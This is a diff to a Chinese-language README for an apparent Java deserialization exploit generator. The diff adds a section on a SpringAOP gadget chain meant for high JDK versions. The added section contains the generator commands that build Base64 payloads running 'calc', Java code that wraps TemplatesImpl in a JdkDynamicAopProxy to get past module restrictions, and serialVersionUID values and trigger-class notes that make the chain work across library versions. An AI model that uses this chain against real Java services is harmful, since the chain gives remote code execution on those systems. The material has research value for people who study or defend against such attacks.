@@ -398,7 +398,7 @@ Getter利用链的漏洞利用方式：
 * JdbcRowImpl：有条件限制，还没研究
 * LdapAttribute：ldap攻击
 * SignedObject：二次Java反序列化
-* TemplatesImpl：加载字节码实现代码执行
+* TemplatesImpl#getOutputProperties：加载字节码实现代码执行
 
 能够触发Getter方法的利用链和Getter利用链的利用方式是多对多关系，所以下面的几种利用链生成方式只介绍Jackson，其他的以此类推：
 
@@ -633,6 +633,94 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 -m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/calc"
 -m YsoAttack -g C3P03_c3p0 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/calc"
 ```
+
+####  SpringAOP(JDK高版本)
+
+描述：这条链其实也可以叫做Jackson利用链，利用链的触发流程和Jackson基本一样。但是区分开来主要是该链针对JDK高版本反序列化而设计的：通过SpringAOP包的动态代理类绕过模块化的限制，使用XString头触发POJONode的toString方法，TemplatesImpl加载的类不继承AbstractTranslet接口。
+
+工具：
+
+```bash
+#DefaultAdvisorChainFactory: serialVersionUID = 273003553246259276L
+-m YsoAttack -g SpringAop1 -a "Templateslmpl0:auto_cmd:calc" -encode="Base64"
+
+#DefaultAdvisorChainFactory: serialVersionUID = 6115154060221772279L
+-m YsoAttack -g SpringAop2 -a "Templateslmpl0:auto_cmd:calc" -encode="Base64"
+```
+
+笔记：简单记录些关于这条链的信息
+
+- 调用栈：
+
+```
+Hashmap#readobject
+	XString#equals 直接触发
+			com.fasterxml.jackson.databind.node.POJONode#toString
+				---利用SpringAOP动态代理Proxy方式稳定触发TemplatesImpl的Get方法---
+				(Proxy)java.lang.reflect.Proxy---(InvocationHandler)org.springframework.aop.framework.JdkDynamicAopProxy#invoke
+				com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
+```
+
+- 绕过模块化限制：使用spring-aop中的JdkDynamicAopProxy来代理javax.xml.transform.Templates, 这样在 出发getoutputProperties时，moudle就是变为了javax.xml.transform  在⼀个包下，绕过了moudle模块化限制。
+
+```java
+ClassPool pool = ClassPool.getDefault();
+
+//使用AdvisedSupport代理TemplatesImpl绕过高版本jdk的模块化检测
+Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+Class<?> advisedSupportClass = Class.forName("org.springframework.aop.framework.AdvisedSupport");
+Constructor<?> constructor = jdkDynamicAopProxyClass.getConstructor(advisedSupportClass);
+constructor.setAccessible(true);
+Object advisedSupport = advisedSupportClass.newInstance();
+
+Method setTarget = advisedSupport.getClass().getMethod("setTarget", Object.class);
+setTarget.invoke(advisedSupport, templates);
+InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(advisedSupport);
+Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[] {Templates.class},(InvocationHandler)invocationHandler);
+```
+
+- org.springframework.aop.framework.DefaultAdvisorChainFactory 类在不同的spring-aop版本中suid值会不同，通过粗略整理发现可能存在俩种suid值。所以ysoSimple写了SpringAop1和SpringAop2
+
+```
+serialver -classpath E:\apache-maven-3.6.1\mvn-repo\org\springframework\spring-aop\6.0.13\spring-aop-6.0.13.jar org.springframework.aop.framework.DefaultAdvisorChainFactory
+org.springframework.aop.framework.DefaultAdvisorChainFactory:    private static final long serialVersionUID = 273003553246259276L;
+
+serialver -classpath E:\apache-maven-3.6.1\mvn-repo\org\springframework\spring-aop\5.2.5.RELEASE\spring-aop-5.2.5.RELEASE.jar org.springframework.aop.framework.DefaultAdvisorChainFactory
+org.springframework.aop.framework.DefaultAdvisorChainFactory:    private static final long serialVersionUID = 6115154060221772279L;
+```
+
+- 触发POJONode#toString的头选择，可以触发toString的反序列化起始点很多但是在JDK高版本下因为一些原因需要做选择
+  - javax.swing.event.EventListenerList的suid：jdk17计算出来和jdk8计算出来不一样，ysoSimple使用jdk8生成利用链数据，所以不使用它作为序列化头
+  - UIDefaults$TextAndMnemonicHashMap的suid：jdk17计算出来和jdk8计算出来不一样
+  - BadAttributeValueExpException在jdk高版本下已经无法再触发toSting
+
+- 关于com.fasterxml.jackson.databind.node.POJONode的可序列化性，该类不是在jackson-databind版本中都可以序列化的，需要jackson-databind>=2.10.0才能序列化
+
+```
+jackson-2.9.10.1 com.fasterxml.jackson.databind.node.POJONode BaseJsonNode 没有继承Serializable接口
+jackson-2.14.2 com.fasterxml.jackson.databind.node.POJONode BaseJsonNode 继承Serializable接口
+```
+
+- TemplatesImpl 利用链加载的类不能继承 AbstractTranslet，因为在JDK高版本下会涉及到模块化的检测导致报错。
+- 拓展利用链：像CB，Jackson，Fastjson这种利用 TemplatesImpl做漏洞利用的链子，其实都可以使用SpringAOP动态代理(JdkDynamicAopProxy)方式稳定触发TemplatesImpl#getOutputProperties，从而实现JDK高版本反序列化的利用。实战中遇到具体情况具体分析利用。
+- 生成序列化数据：如果是jdk高版本生成利用链需要带下面参数。jdk8生成的话就不需要加：
+
+  ```
+  --add-opens java.base/java.io=ALL-UNNAMED
+  ```
+
+
+所以使用 SpringAop 高版本Java利用链时需要关注以下几点：
+
+1. TemplatesImpl 不继承 AbstractTranslet
+2. CB，Jackson，Fastjson使用SpringAOP动态代理(JdkDynamicAopProxy)Proxy方式稳定触发TemplatesImpl#getOutputProperties
+3. Jackson的版本需要jackson-databind>=2.10.0
+4. org.springframework.aop.framework.DefaultAdvisorChainFactory 版本不同suid也会不同,目前测出来有俩种suid
+5. Jackson，Fastjson的触发头用XString来触发toString方法来解决suid问题
+6. 被舍弃的触发toString头：
+   - BadAttributeValueExpException在jdk高版本无法触发toSting
+   - EventListenerList在不同jdk版本的编译下suid不同，所以jdk8生成的suid不能在jdk17使用
+   - UIDefaults$TextAndMnemonicHashMap在不同jdk版本的编译下suid不同(未测试)，所以jdk8生成的suid不能在jdk17使用
 
 ## 2.Hessian反序列化(​HessianAttack)
 
